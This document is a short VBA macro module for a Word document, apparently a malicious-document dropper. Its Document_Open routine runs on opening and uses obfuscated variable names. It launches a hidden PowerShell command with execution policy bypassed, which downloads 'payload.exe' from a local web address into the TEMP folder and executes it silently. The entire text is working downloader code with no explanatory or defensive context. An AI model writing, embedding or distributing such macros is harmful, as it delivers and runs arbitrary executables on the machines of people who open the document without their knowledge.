Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim lckhv437 As String
    Dim xcx6ug6uo As Object
    Dim sarv21hmdtd5d As String, outPath As String
    sarv21hmdtd5d = "http://127.0.0.1:9090/payload.exe"
    outPath = Environ("TEMP") & "\oblivionx_payload.exe"
    lckhv437 = "powershell.exe -NoProfile -WindowStyle Hidden " & _
          "-ExecutionPolicy Bypass -Command " & Chr(34) & _
          "(New-Object System.Net.WebClient).DownloadFile('" & sarv21hmdtd5d & "','" & outPath & "'); " & _
          "Invoke-Item '" & outPath & "'" & Chr(34)
    Set xcx6ug6uo = CreateObject("WScript.Shell")
    xcx6ug6uo.Run lckhv437, 0, False
End Sub
